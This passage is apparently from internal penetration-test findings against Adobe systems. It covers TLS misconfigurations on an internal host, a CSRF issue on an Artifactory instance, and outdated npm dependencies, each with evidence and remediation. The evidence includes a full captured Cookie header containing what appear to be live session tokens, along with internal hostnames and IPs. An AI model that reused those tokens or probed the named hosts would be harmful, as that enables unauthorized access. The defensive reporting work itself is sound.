12. **cipher_order**: Poor ordering of cipher suites may result in the server using weak or outdated encryption methods.
13. **DNS_CAArecord**: Missing DNS CAA records can result in unauthorized certificates being issued for the domain.
14. **HSTS**: Without HTTP Strict Transport Security, attackers can downgrade HTTPS connections to HTTP, allowing man-in-the-middle attacks.
15. **LUCKY13**: A timing side-channel attack that affects CBC-mode ciphers in TLS.
16. **OCSP_stapling**: Not implementing OCSP stapling can lead to slow or incomplete certificate revocation checks.
17. **security_headers**: Missing security headers increases the risk of XSS, clickjacking, and other client-side attacks.
18. **SWEET32**: Exploits 64-bit block ciphers to perform a birthday attack, potentially decrypting encrypted data.
19. **TLS1**: TLS 1.0 is outdated and vulnerable to several attacks, such as BEAST and POODLE.
20. **TLS1_1**: TLS 1.1 is vulnerable to attacks like LUCKY13 and should no longer be used.

# Impact:
1. **BEAST**: An attacker can decrypt sensitive information such as session cookies, making man-in-the-middle attacks easier.
2. **BEAST_CBC_TLS1**: Exploits TLS 1.0's CBC-mode encryption, compromising data confidentiality.
3. **BREACH**: Leaks sensitive information like session tokens or CSRF tokens, allowing privilege escalation.
4. **cert_chain_of_trust**: Users cannot establish trust with the server, allowing attackers to impersonate the service.
5. **cert_expirationStatus**: Expired certificates lead to untrusted connections, allowing interception.
6. **cert_notAfter**: Invalid certificates expose connections to tampering and interception.
7. **cert_revocation**: Not checking certificate revocation can allow compromised certificates to remain valid, enabling impersonation.
8. **cert_subjectAltName**: Misconfigured SAN values can lead to SSL warnings or failed connections, decreasing user trust.
9. **cert_trust**: Untrusted certificates result in untrusted connections, allowing attackers to impersonate the server.
10. **cipherlist_3DES_IDEA**: Weak ciphers expose traffic to cryptographic attacks like SWEET32.
11. **cipherlist_AVERAGE**: Weak ciphers provide subpar encryption, leading to easier exploitation.
12. **cipher_order**: Incorrect cipher ordering allows weaker ciphers to be used, potentially compromising data.
13. **DNS_CAArecord**: Missing CAA records can lead to unauthorized certificates, increasing the risk of impersonation.
14. **HSTS**: Without HSTS, users can be redirected to HTTP versions of the site, allowing attackers to steal credentials or alter content.
15. **LUCKY13**: An attacker could decrypt some portions of the encrypted communication by exploiting CBC-mode ciphers.
16. **OCSP_stapling**: Without OCSP stapling, users may unknowingly use expired or revoked certificates.
17. **security_headers**: Exposes the application to client-side attacks such as XSS and clickjacking.
18. **SWEET32**: Large amounts of traffic can be decrypted, exposing sensitive data in communications.
19. **TLS1**: This protocol is deprecated and exposes users to several attacks that compromise confidentiality and integrity.
20. **TLS1_1**: Similar to TLS 1.0, this protocol is deprecated and vulnerable to multiple cryptographic weaknesses.

# Affected Assets:
## Affected Host(s)
1. 10.50.227.144 (or1dra824.corp.adobe.com) [10071/tcp]
2. 10.50.227.144 (or1dra824.corp.adobe.com) [1311/tcp]
3. 10.50.227.144 (or1dra824.corp.adobe.com) [443/tcp]
4. 10.50.227.144 (or1dra824.corp.adobe.com) [443/tcp]

# Evidence:
| ip            | fqdn                     | port  | severity | id                    | finding                                                                              | cve                         | cwe     |
|---------------|--------------------------|-------|----------|-----------------------|--------------------------------------------------------------------------------------|-----------------------------|---------|
| 10.50.227.144 | or1dra824.corp.adobe.com | 443   | MEDIUM   | cipherlist_3DES_IDEA  | offered                                                                              |                             | CWE-310 |
| 10.50.227.144 | or1dra824.corp.adobe.com | 443   | LOW      | cipherlist_AVERAGE    | offered                                                                              |                             | CWE-310 |
| 10.50.227.144 | or1dra824.corp.adobe.com | 443   | HIGH     | cert_trust            | certificate does not match supplied URI (same w/o SNI)                               |                             |         |
| 10.50.227.144 | or1dra824.corp.adobe.com | 443   | LOW      | OCSP_stapling         | not offered                                                                          |                             |         |
| 10.50.227.144 | or1dra824.corp.adobe.com | 443   | LOW      | DNS_CAArecord         | --                                                                                   |                             |         |
| 10.50.227.144 | or1dra824.corp.adobe.com | 443   | LOW      | HSTS                  | not offered                                                                          |                             |         |
| 10.50.227.144 | or1dra824.corp.adobe.com | 443   | MEDIUM   | security_headers      | --                                                                                   |                             |         |
| 10.50.227.144 | or1dra824.corp.adobe.com | 443   | LOW      | SWEET32               | uses 64 bit block ciphers                                                            | CVE-2016-2183 CVE-2016-6329 | CWE-327 |
| 10.50.227.144 | or1dra824.corp.adobe.com | 443   | LOW      | LUCKY13               | potentially vulnerable, uses TLS CBC ciphers                                         | CVE-2013-0169               | CWE-310 |
| 10.50.227.144 | or1dra824.corp.adobe.com | 10071 | LOW      | TLS1                  | offered (deprecated)                                                                 |                             |         |
| 10.50.227.144 | or1dra824.corp.adobe.com | 10071 | LOW      | TLS1_1                | offered (deprecated)                                                                 |                             |         |
| 10.50.227.144 | or1dra824.corp.adobe.com | 1311  | LOW      | cipherlist_AVERAGE    | offered                                                                              |                             | CWE-310 |
| 10.50.227.144 | or1dra824.corp.adobe.com | 443   | MEDIUM   | cipherlist_3DES_IDEA  | offered                                                                              |                             | CWE-310 |
| 10.50.227.144 | or1dra824.corp.adobe.com | 443   | LOW      | cipherlist_AVERAGE    | offered                                                                              |                             | CWE-310 |
| 10.50.227.144 | or1dra824.corp.adobe.com | 10071 | LOW      | cipherlist_AVERAGE    | offered                                                                              |                             | CWE-310 |
| 10.50.227.144 | or1dra824.corp.adobe.com | 1311  | HIGH     | cipher_order          | NOT a cipher order configured                                                        |                             |         |
| 10.50.227.144 | or1dra824.corp.adobe.com | 1311  | CRITICAL | cert_chain_of_trust   | failed (self signed).                                                                |                             |         |
| 10.50.227.144 | or1dra824.corp.adobe.com | 1311  | HIGH     | cert_revocation       | Neither CRL nor OCSP URI provided                                                    |                             |         |
| 10.50.227.144 | or1dra824.corp.adobe.com | 1311  | LOW      | DNS_CAArecord         | --                                                                                   |                             |         |
| 10.50.227.144 | or1dra824.corp.adobe.com | 10071 | HIGH     | cert_subjectAltName   | No SAN, browsers are complaining                                                     |                             |         |
| 10.50.227.144 | or1dra824.corp.adobe.com | 10071 | HIGH     | cert_trust            | certificate does not match supplied URI (same w/o SNI)                               |                             |         |
| 10.50.227.144 | or1dra824.corp.adobe.com | 10071 | CRITICAL | cert_chain_of_trust   | failed (self signed).                                                                |                             |         |
| 10.50.227.144 | or1dra824.corp.adobe.com | 10071 | CRITICAL | cert_expirationStatus | expired                                                                              |                             |         |
| 10.50.227.144 | or1dra824.corp.adobe.com | 10071 | CRITICAL | cert_notAfter         | 3/9/23 20:38                                                                         |                             |         |
| 10.50.227.144 | or1dra824.corp.adobe.com | 10071 | HIGH     | cert_revocation       | Neither CRL nor OCSP URI provided                                                    |                             |         |
| 10.50.227.144 | or1dra824.corp.adobe.com | 10071 | LOW      | DNS_CAArecord         | --                                                                                   |                             |         |
| 10.50.227.144 | or1dra824.corp.adobe.com | 1311  | MEDIUM   | BREACH                | potentially VULNERABLE, gzip HTTP compression detected  - only supplied '/' tested   | CVE-2013-3587               | CWE-310 |
| 10.50.227.144 | or1dra824.corp.adobe.com | 1311  | LOW      | LUCKY13               | potentially vulnerable, uses TLS CBC ciphers                                         | CVE-2013-0169               | CWE-310 |
| 10.50.227.144 | or1dra824.corp.adobe.com | 10071 | MEDIUM   | BEAST_CBC_TLS1        | ECDHE-ECDSA-AES128-SHA ECDHE-ECDSA-AES256-SHA                                        | CVE-2011-3389               | CWE-20  |
| 10.50.227.144 | or1dra824.corp.adobe.com | 10071 | LOW      | BEAST                 | VULNERABLE -- but also supports higher protocols  TLSv1.1 TLSv1.2 (likely mitigated) | CVE-2011-3389               | CWE-20  |
| 10.50.227.144 | or1dra824.corp.adobe.com | 10071 | LOW      | LUCKY13               | potentially vulnerable, uses TLS CBC ciphers                                         | CVE-2013-0169               | CWE-310 |
| 10.50.227.144 | or1dra824.corp.adobe.com | 443   | HIGH     | cert_trust            | certificate does not match supplied URI (same w/o SNI)                               |                             |         |
| 10.50.227.144 | or1dra824.corp.adobe.com | 443   | LOW      | OCSP_stapling         | not offered                                                                          |                             |         |
| 10.50.227.144 | or1dra824.corp.adobe.com | 443   | LOW      | DNS_CAArecord         | --                                                                                   |                             |         |
| 10.50.227.144 | or1dra824.corp.adobe.com | 443   | LOW      | HSTS                  | not offered                                                                          |                             |         |
| 10.50.227.144 | or1dra824.corp.adobe.com | 443   | MEDIUM   | security_headers      | --                                                                                   |                             |         |
| 10.50.227.144 | or1dra824.corp.adobe.com | 443   | LOW      | SWEET32               | uses 64 bit block ciphers                                                            | CVE-2016-2183 CVE-2016-6329 | CWE-327 |
| 10.50.227.144 | or1dra824.corp.adobe.com | 443   | LOW      | LUCKY13               | potentially vulnerable, uses TLS CBC ciphers                                         | CVE-2013-0169               | CWE-310 |

# Replicate Finding:
1. Download and install [testssl.sh](https://testssl.sh/)
2. Run the following command: `testssl.sh --append --assume-http --full --parallel --sneaky -oA "testssl_output" IMPACTED_URI_GOES_HERE`
3. Review output

# Mitigation/Remediation:
We recommend the following:

1. **BEAST**: Disable TLS 1.0 and enforce TLS 1.2+.  
**Sample Config** (Nginx):  
```nginx
ssl_protocols TLSv1.2 TLSv1.3;
```

2. **BEAST_CBC_TLS1**: Disable CBC-mode ciphers and upgrade to TLS 1.2 or higher.  
**Sample Config** (Apache):  
```apache
SSLProtocol all -TLSv1;
SSLCipherSuite HIGH:!aNULL:!MD5:!3DES:!CAMELLIA;
```

3. **BREACH**: Disable HTTP compression or ensure secrets are not compressed.  
**Sample Config** (Nginx):  
```nginx
gzip off;
```

4. **cert_chain_of_trust**: Ensure a complete and valid certificate chain is installed.  

5. **cert_expirationStatus**: Renew certificates before expiration.  

6. **cert_notAfter**: Ensure valid certificate dates.  

7. **cert_revocation**: Enable certificate revocation checks via OCSP or CRL.  

8. **cert_subjectAltName**: Ensure proper configuration of SAN values.  

9. **cert_trust**: Install certificates from trusted CAs only.  

10. **cipherlist_3DES_IDEA**: Disable weak ciphers like 3DES and IDEA.  
**Sample Config** (Nginx):  
```nginx
ssl_ciphers "ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256";
```

11. **cipherlist_AVERAGE**: Upgrade to stronger ciphers like AES-GCM.  
**Sample Config** (Apache):  
```apache
SSLCipherSuite HIGH:!aNULL:!MD5;
```

12. **cipher_order**: Configure the server to enforce strong cipher ordering.  
**Sample Config** (Nginx):  
```nginx
ssl_prefer_server_ciphers on;
```

13. **DNS_CAArecord**: Set CAA records in DNS to restrict which CAs can issue certificates.  
**Sample DNS Record**:  
```bash
example.com. IN CAA 0 issue "letsencrypt.org"
```

14. **HSTS**: Enable HSTS to force browsers to use HTTPS.  
**Sample Config** (Nginx):  
```nginx
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
```

15. **LUCKY13**: Disable CBC-mode ciphers and enforce GCM ciphers.  

16. **OCSP_stapling**: Enable OCSP stapling for certificate revocation checks.  
**Sample Config** (Nginx):  
```nginx
ssl_stapling on;
ssl_stapling_verify on;
```

17. **security_headers**: Add security headers like X-Frame-Options, Content-Security-Policy, etc.  
**Sample Config** (Nginx):  
```nginx
add_header X-Frame-Options "SAMEORIGIN";
add_header Content-Security-Policy "default-src 'self'";
```

18. **SWEET32**: Disable 3DES and other vulnerable ciphers.  
**Sample Config** (Apache):  
```apache
SSLCipherSuite HIGH:!3DES:!aNULL:!MD5;
```

19. **TLS1**: Disable TLS 1.0 and enforce TLS 1.2+.  
**Sample Config** (Nginx):  
```nginx
ssl_protocols TLSv1.2 TLSv1.3;
```

20. **TLS1_1**: Disable TLS 1.1 and enforce TLS 1.2+.  
**Sample Config** (Nginx):  
```nginx
ssl_protocols TLSv1.2 TLSv1.3;
```

**Be advised, the above patch should be applied to all other system(s) running the impacted software that are managed by the team.**

# References: 
1. https://breachattack.com/
2. https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Security_Cheat_Sheet.html
3. https://csrc.nist.gov/pubs/sp/800/52/r2/final
4. https://datatracker.ietf.org/doc/html/rfc5280
5. https://datatracker.ietf.org/doc/html/rfc6960
6. https://datatracker.ietf.org/doc/html/rfc7457
7. https://datatracker.ietf.org/doc/html/rfc8996
8. https://docs.aws.amazon.com/acm/latest/userguide/managed-renewal.html
9. https://letsencrypt.org/docs/caa/
10. https://letsencrypt.org/docs/integration-guide/
11. https://owasp.org/www-project-secure-headers/#http-strict-transport-security
12. https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/04-Testing_for_Weak_Encryption
13. https://ssl-config.mozilla.org/
14. https://sweet32.info/
15. https://wiki.mozilla.org/Security/Server_Side_TLS
16. https://www.rfc-editor.org/rfc/rfc8996


---
# File: /Users/gbiagomba/Documents/Adobe/Security Assessments/Threat Model Artifactory Access/Findings/Submitted/Artifactory Access - Cross Site Request Forgery (XSRF) - Medium (6.3).md
---

# Risk: Medium (6.3)
**CVSS Vector (CVSS:3.1):** /AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:L

# Description:
While perfoming a security code review of `Artifactory Access`, we observed the noted webapp was susceptible to an XSRF (Cross Site Request Forgery) attack. Cross-site request forgery (CSRF) vulnerabilities may arise when applications rely solely on HTTP cookies to identify the user that has issued a particular request. Because browsers automatically add cookies to requests regardless of their origin, it may be possible for an attacker to create a malicious web site that forges a cross-domain request to the vulnerable application. During testing we observed the web application did not use any XSRF tokens with any forms.

# Impact:
An attacker could change a user's query and pass perform unauthorized actions. These actions can lead to financial loss, data theft, or repetitional damage for both the user and Adobe. Additionally, CSRF attacks can be challenging to detect because they appear to be legitimate requests coming from the user's browser.

# Affected Assets:
## Affected URL(s):
1. https://artifactory.corp.adobe.com/ui/api/v1/mds/packages
2. https://artifactory.corp.adobe.com/ui/api/v1/ui/auth/login
3. https://artifactory.corp.adobe.com/ui/api/v1/ui/auth/loginRelatedData

# Evidence:
## Request:
```HTTP
POST /ui/api/v1/mds/packages?jfLoader=true HTTP/1.1
Host: artifactory.corp.adobe.com
Cookie: OptanonAlertBoxClosed=2024-06-03T20:31:46.671Z; OptanonConsent=groups=C0001%3A1%2CC0002%3A1%2CC0003%3A1%2CC0004%3A1; kndctr_9E1005A551ED61CA0A490D45_AdobeOrg_consent=general%3Din; _cs_c=0; _scid=3f65d8ac-a3a6-4368-8f96-f4012d5a7b22; _tt_enable_cookie=1; _ttp=sqgXU6leYCmkBW6RFXtuOop67oT; s_ecid=MCMID%7C68252571855136552702238539336569704049; OptanonChoice=1; TID=-D8F91K5J-; _cs_id=591e9f62-6470-a78a-9818-190dd4bc93bc.1717446707.2.1717471150.1717471150.1.1751610707164.0; forterToken=e005d2fe98964904b73c7aa1bfef758a_1717536167029__UDF43-m4_13ck_; mbox=PC#68252571855136552702238539336569704049-hlOhwS.35_0#1780780969|session#79d4d75fda5e4eaeb0c60f0471ce1260#1717538029; apt.uid=AP-FESSAAK1LHWP-2-1717536170062-72318774.0.2.29cbcfd9-b13c-4ef6-aea7-31bb2c5eb992; kndctr_9E1005A551ED61CA0A490D45_AdobeOrg_identity=CiY2ODI1MjU3MTg1NTEzNjU1MjcwMjIzODUzOTMzNjU2OTcwNDA0OVISCPXxs%5F79MRABGAEqA09SMjAA8AGu7sXxiTI%3D; ab.storage.deviceId.c374d0d3-4249-4ff1-8a44-91b417c11c69=%7B%22g%22%3A%22d5e71a6f-244d-5b9a-400b-ad6367faf607%22%2C%22c%22%3A1717536175280%2C%22l%22%3A1720640961640%7D; ab.storage.userId.c374d0d3-4249-4ff1-8a44-91b417c11c69=%7B%22g%22%3A%22734F1E44665F722A0A495FDF%40AdobeID%22%2C%22c%22%3A1717536175267%2C%22l%22%3A1720640961640%7D; ab.storage.sessionId.c374d0d3-4249-4ff1-8a44-91b417c11c69=%7B%22g%22%3A%22b7a14380-2588-d9d8-030d-fb22bc820534%22%2C%22e%22%3A1720642763629%2C%22c%22%3A1720640961640%2C%22l%22%3A1720640963629%7D; _gcl_au=1.1.323665853.1725913028; _fbp=fb.1.1725913028184.683609351988360229; adcloud={%22_les_v%22:%22c%2Cy%2Cadobe.com%2C1725914828%22}; AMCV_9E1005A551ED61CA0A490D45%40AdobeOrg=-2121179033%7CMCMID%7C68252571855136552702238539336569704049%7CMCAID%7CNONE%7CMCOPTOUT-1725920228s%7CNONE%7CMCAAMLH-1726517828%7C9%7CMCAAMB-1726517828%7Cj8Odv6LonN4r3an7LhD3WZrU1bUpAkFkkiY1ncBR96t2PTI%7CvVersion%7C5.3.0%7CMCIDTS%7C19976%7CMCCIDH%7C-1461582827%7CMCSYNCSOP%7C411-19983; _ScCbts=%5B%5D; _sctr=1%7C1725854400000; creative-cloud-theme=device; s_nr=1725913380695-Repeat; _uetvid=4ca0a38021e811efaf5e89cd846667fb; acomsis=1; AMCV_D6FAAFAD54CA9F560A4C98A5%40AdobeOrg=-637568504%7CMCMID%7C68252571855136552702238539336569704049%7CMCIDTS%7C19976%7CMCAAMLH-1726518181%7C9%7CMCAAMB-1726518181%7Cj8Odv6LonN4r3an7LhD3WZrU1bUpAkFkkiY1ncBR96t2PTI%7CMCOPTOUT-1725920581s%7CNONE%7CMCSYNCSOP%7C411-19983%7CvVersion%7C5.1.1; _scid_r=ZZ0_Zdiso6ZmaNCW9AEtWnsi--69SMwwv_k6mw; kndctr_533E28D76436B6E40A495CBE_AdobeOrg_identity=CiY2ODI1MjU3MTg1NTEzNjU1MjcwMjIzODUzOTMzNjU2OTcwNDA0OVIQCJ3K78icMhgBKgNPUjIwA_AB6deH4J4y; aux_sid=AUWH0K8Ohy6CAk-bM-mrasnSB8lbkEWZibUC_ZE5BMM1LS1fNHEKlaUjW_0pW0IL4kG3IcHDtHg_5y45jJGxc_Do4xJvn4m4XpH_DzkqBvdon3783XCKVRyH6IaIAicyC3_Ml6kI_FI98IQ-qZZ-d55PfwhEL3eEkZz_0bLtEHLl7xsAl_71J4f0sPzimZFc54qOvHZTB6z7Nmzcpw_mdxd-BXfYNVdzQTWVss30BvVM60Hs_H192omjgmv5DLNEDFE8WhafSwqnuoH3VHg_5SUMSql7acY0eorQxCdES08urTyOf2epJGGfUWNHrlN3ebselv0GuAGVTW92SQ4v708drVh9XNDQo1O88AnMvcq8Ma9Wffi4u2HKoC9uKZtnOwUi0s7GmCTaiCFrT1b6spY2133ryCJZDEK8E5IUvQ3QlP5T5r7o19t8hS9eKQlJ7P2K3LnbiTSN_i61BqCq2vWvR0wdv5i_LMR_0DC2nB6lJ4zpkwlKeOImVvJ8ahXiMkyGEmrF5en0XoJTgAR7enhzbHoAdIEB_Hn8kiRXITg5EtlNnq6RXrcMfpyaU7__xihgku_eCt87nVeUv51XpQTwZReduTASbaOu7o1Bl1m5xjDWR91Y4eSzBthh04Jx69CuQQn1dWx8-oKUxz2xMe2jitLd2m_weut5UF-rchS-QQdhyokEmTVVwChNLsKyyFkEurDNcQuttDyH7fd1_Q5HuIfmw3n4m39xnA6VYFn08xVxUakpMoDHJjW2rXAAb1zbmZ3kL1k7WTJULCdjYSghpcHwBP4; fs_uid=#o-1X0HP2-na1#d4630d16-1a65-456b-a84e-7e634afedd55:e61eca23-5a06-4489-9b50-8eb18adaf1a4:1726254325051::3#2a2aa51a#/1757192057
Content-Length: 530
Sec-Ch-Ua: "Not;A=Brand";v="24", "Chromium";v="128"
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
Content-Type: application/json
Accept: application/json, text/plain, */*
X-Requested-With: XMLHttpRequest
Sec-Ch-Ua-Platform: "macOS"
Origin: https://artifactory.corp.adobe.com
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Accept-Encoding: gzip, deflate, br
Priority: u=1, i
Connection: keep-alive
```

## Response:
```HTTP
HTTP/1.1 200 OK
Date: Mon, 16 Sep 2024 18:51:59 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 400
Connection: keep-alive
Cache-Control: no-store, no-cache, must-revalidate, proxy-revalidate, max-age=0
Content-Security-Policy: script-src 'self' 'unsafe-eval'; font-src 'self' data:; base-uri 'self'; style-src 'self' 'unsafe-inline'; form-action 'self'; frame-ancestors 'self'
Etag: W/"190-thFbZfzvPNbdpopYtOwRUeYk/qw"
Expires: 0
Feature-Policy: geolocation 'none';microphone 'none';camera 'none';payment 'none'
Pragma: no-cache
Referrer-Policy: no-referrer
Surrogate-Control: no-store
Vary: Accept-Encoding
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
X-Xss-Protection: 1; mode=block

{"data":{"packages":{"edges":[{"node":{"id":"npm://-","name":"-","created":"2021-07-18T15:44:39.158Z","modified":"2020-04-02T11:49:01Z","versionsCount":1,"description":null,"latestVersion":"0.0.1","packageType":"npm","stats":{"downloads":28,"followers":0},"licenses":[{"name":"UNLICENSED","source":""}],"tags":[],"vulnerabilities":null}}],"pageInfo":{"hasNextPage":true,"endCursor":"UGFja2FnZTox"}}}}
```

# Replicate Finding:
1. To replicate the steps in burp: https://portswigger.net/support/using-burp-to-test-for-cross-site-request-forgery
2. If you are not using burp or some other proxy, enter for the following command in the terminal:```curl -i -s -k -X $'GET' \
    -H $'Host: 127.0.0.1:5000' -H $'Cache-Control: max-age=0' -H $'Upgrade-Insecure-Requests: 1' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' -H $'Sec-Fetch-Site: same-origin' -H $'Sec-Fetch-Mode: navigate' -H $'Sec-Fetch-User: ?1' -H $'Sec-Fetch-Dest: document' -H $'sec-ch-ua: \"Not(A:Brand\";v=\"24\", \"Chromium\";v=\"122\"' -H $'sec-ch-ua-mobile: ?0' -H $'sec-ch-ua-platform: \"macOS\"' -H $'Referer: http://127.0.0.1:5000/' -H $'Accept-Encoding: gzip, deflate, br' -H $'Accept-Language: en-US,en;q=0.9' -H $'Connection: close' \
    $'https://artifactory.corp.adobe.com/ui/api/v1/mds/packages'```

# Mitigation/Remediation:
We recommend  implementing anti-CSRF tokens into all requests that perform actions which change the application state or which add/modify/delete content. An anti-CSRF token should be a long randomly generated value unique to each user so that attackers cannot easily brute-force it.  It is important that anti-CSRF tokens are validated when user requests are handled by the application. The application should both verify that the token exists in the request, and also check that it matches the user's current token. If either of these checks fails, the application should reject the request.

**Be advised, the above patch should be applied to all other system(s) running the impacted software that are managed by the team.**

# References:
1. [Web Security Academy: Cross-site request forgery](https://portswigger.net/web-security/csrf)
2. [Using Burp to Test for Cross-Site Request Forgery](https://support.portswigger.net/customer/portal/articles/1965674-using-burp-to-test-for-cross-site-request-forgery-csrf-)
3. [The Deputies Are Still Confused](https://media.blackhat.com/eu-13/briefings/Lundeen/bh-eu-13-deputies-still-confused-lundeen-wp.pdf)
4. [CWE-352: Cross-Site Request Forgery (CSRF)](https://cwe.mitre.org/data/definitions/352.html)
5. [CAPEC-62: Cross Site Request Forgery](https://capec.mitre.org/data/definitions/62.html)



---
# File: /Users/gbiagomba/Documents/Adobe/Security Assessments/Threat Model Artifactory Access/Findings/Submitted/Artifactory Access - Outdated Vulnerable Software - Medium (4.8).md
---

# Risk: Medium (4.8)
`CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N`

Based on the risk, the SLA to fix the ticket is **60** days. The team must fix this issue by **2024-10-06**, per Adobe's[Vulnerability Management Standard](https://inside.corp.adobe.com/content/dam/corporate-policies/documents/Vulnerability-Management-Standard.pdf#page=2)

**NOTE: ** The score was derived from the highest vulnerability in the software dependency package. For a breakdown of each reach, please reference the spreadsheet in the evidence section.  

# Executive Summary
During a security review of JFrog Artifactory, it was discovered that the application uses several outdated NPM packages with known vulnerabilities. These vulnerabilities could be exploited by attackers to compromise the security of the Artifactory instance, potentially leading to unauthorized access, data breaches, and disruption of services. Given that Artifactory is a critical component in the software development lifecycle, ensuring its security is paramount to maintaining the integrity of the software artifacts it manages.

## Detailed Finding
While conducting a security review of `Artifactory Access`, we observed the noted web application used outdated 3P software with known vulnerabilities.  Specifically, the web application was found to be using outdated versions of several NPM packages, including `axios@0.26.1`, `babel-jest@23.6.0`, and `billboard.js@1.9.5`. These packages have known vulnerabilities such as Cross-site Scripting (XSS), Regular Expression Denial of Service (ReDoS), and arbitrary code execution. For instance, `axios@0.26.1` is vulnerable to XSS and ReDoS attacks, which can be exploited by injecting malicious scripts or causing the application to hang by using complex regular expressions[[1]](https://cybersecuritynews.com/jfrog-artifactory-flaw/). Similarly, `babel-jest@23.6.0` has a vulnerability that allows arbitrary code execution, potentially enabling attackers to run malicious code on the server.

## Impact
If an attacker successfully exploits these vulnerabilities, they could gain unauthorized access to the Artifactory instance, manipulate stored artifacts, or disrupt the service. This could result in the distribution of malicious software, data breaches, and significant downtime. Additionally, Attackers could leverage these vulnerabilities to manipulate or corrupt artifacts, leading to the distribution of compromised software. Furthermore, Artifactory integrates seamlessly into DevOps workflows, any breach could have cascading effects across the entire software development and deployment pipeline.  Given that Artifactory is only accessible within the network or through a VPN, the attack surface is limited, but the potential impact remains high due to the critical nature of the service. 

# Affected Assets:
## Affected Software:
1. **@vue/cli-plugin-babel@3.2.0**: Known vulnerabilities[1](https://stackoverflow.com/questions/67804481/how-to-fix-vue-cli-vulnerabilities).
2. **@vue/cli-plugin-eslint@3.2.0**: Known vulnerabilities[1](https://stackoverflow.com/questions/67804481/how-to-fix-vue-cli-vulnerabilities).
3. **@vue/cli-plugin-unit-jest@3.4.0**: Known vulnerabilities[1](https://stackoverflow.com/questions/67804481/how-to-fix-vue-cli-vulnerabilities).
4. **@vue/cli-service@3.2.0**: Known vulnerabilities[1](https://stackoverflow.com/questions/67804481/how-to-fix-vue-cli-vulnerabilities).
5. **axios@0.26.1**: Vulnerable to Cross-site Scripting (XSS) and Regular Expression Denial of Service (ReDoS)[4](https://vuejs.org/guide/best-practices/security.html).
6. **babel-core@7.0.0-bridge.0**: Vulnerable to inefficient regular expression complexity[5](https://github.com/vuejs/vue-cli/issues/3257).
7. **babel-jest@23.6.0**: Vulnerable to arbitrary code execution[7](https://blog.csdn.net/ioncannontic/article/details/136627999).
8. **billboard.js@1.9.5**: Vulnerable to ReDoS due to d3-color dependency[8](https://stackoverflow.com/questions/75548558/fixing-eslint-related-dependency-errors-in-node-js-vue-based-project).

## Affected Host(s):
- 10.50.227.143 (artifactory.corp.adobe.com) [443/tcp]

# Evidence:
## Snyk:
```
Testing /Users/gbiagomba/Projects/Threat Model Artifactory Access/src...

Tested 1527 dependencies for known issues, found 57 issues, 171 vulnerable paths.


Issues to fix by upgrading:

  Upgrade @vue/cli-plugin-babel@3.2.0 to @vue/cli-plugin-babel@4.1.0 to fix
  ‚úó Missing Release of Resource after Effective Lifetime [Medium Severity][https://security.snyk.io/vuln/SNYK-JS-INFLIGHT-6095116] in inflight@1.0.6
    introduced by js-beautify@1.14.4 > glob@7.2.3 > inflight@1.0.6 and 5 other path(s)

  Upgrade @vue/cli-plugin-eslint@3.2.0 to @vue/cli-plugin-eslint@5.0.0 to fix
  ‚úó Server-side Request Forgery (SSRF) [Medium Severity][https://security.snyk.io/vuln/SNYK-JS-REQUEST-3361831] in request@2.88.2
    introduced by less@3.8.1 > request@2.88.2 and 4 other path(s)
  ‚úó Prototype Pollution [Medium Severity][https://security.snyk.io/vuln/SNYK-JS-TOUGHCOOKIE-5672873] in tough-cookie@2.5.0
    introduced by less@3.8.1 > request@2.88.2 > tough-cookie@2.5.0 and 7 other path(s)
  ‚úó Missing Release of Resource after Effective Lifetime [Medium Severity][https://security.snyk.io/vuln/SNYK-JS-INFLIGHT-6095116] in inflight@1.0.6
    introduced by js-beautify@1.14.4 > glob@7.2.3 > inflight@1.0.6 and 5 other path(s)
  ‚úó Prototype Pollution [High Severity][https://security.snyk.io/vuln/SNYK-JS-UNSETVALUE-2400660] in unset-value@1.0.0
    introduced by @vue/cli-plugin-eslint@3.2.0 > globby@8.0.2 > fast-glob@2.2.7 > micromatch@3.1.10 > braces@2.3.2 > snapdragon@0.8.2 > base@0.11.2 > cache-base@1.0.1 > unset-value@1.0.0 and 2 other path(s)
  ‚úó Prototype Pollution [High Severity][https://security.snyk.io/vuln/SNYK-JS-AJV-584908] in ajv@5.5.2
    introduced by @vue/cli-plugin-eslint@3.2.0 > eslint@4.19.1 > ajv@5.5.2 and 1 other path(s)
  ‚úó Regular Expression Denial of Service (ReDoS) [High Severity][https://security.snyk.io/vuln/SNYK-JS-ANSIREGEX-1583908] in ansi-regex@2.1.1
    introduced by @vue/cli-plugin-eslint@3.2.0 > eslint@4.19.1 > babel-code-frame@6.26.0 > chalk@1.1.3 > has-ansi@2.0.0 > ansi-regex@2.1.1 and 7 other path(s)
  ‚úó Regular Expression Denial of Service (ReDoS) [High Severity][https://security.snyk.io/vuln/SNYK-JS-CROSSSPAWN-8303230] in cross-spawn@5.1.0
    introduced by @vue/cli-plugin-eslint@3.2.0 > eslint@4.19.1 > cross-spawn@5.1.0 and 1 other path(s)

  Upgrade @vue/cli-plugin-unit-jest@3.4.0 to @vue/cli-plugin-unit-jest@5.0.0 to fix
  ‚úó Server-side Request Forgery (SSRF) [Medium Severity][https://security.snyk.io/vuln/SNYK-JS-REQUEST-3361831] in request@2.88.2
    introduced by less@3.8.1 > request@2.88.2 and 4 other path(s)
  ‚úó Prototype Pollution [Medium Severity][https://security.snyk.io/vuln/SNYK-JS-TOUGHCOOKIE-5672873] in tough-cookie@2.5.0
    introduced by less@3.8.1 > request@2.88.2 > tough-cookie@2.5.0 and 7 other path(s)
